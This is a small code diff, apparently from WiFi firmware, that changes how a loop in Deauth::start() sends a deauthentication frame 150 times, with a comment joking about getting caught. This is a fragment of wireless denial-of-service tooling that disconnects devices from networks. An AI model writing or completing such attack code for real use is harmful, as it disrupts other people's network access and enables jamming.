@@ -124,7 +124,7 @@ void Deauth::start() {
 
     // send the deauth 150 times(ur cooked if they find out)
     for (int i = 0; i < 150; ++i) {
-        wifi_send_pkt_freedom(const_cast<uint8_t*>(deauthFrame), frameSize, 0);
+        WiFi.rawPacket(deauthFrame, sizeof(deauthFrame));
         Serial.println("(>-<) Sent Deauth Frame!");
         delay(100);
     }
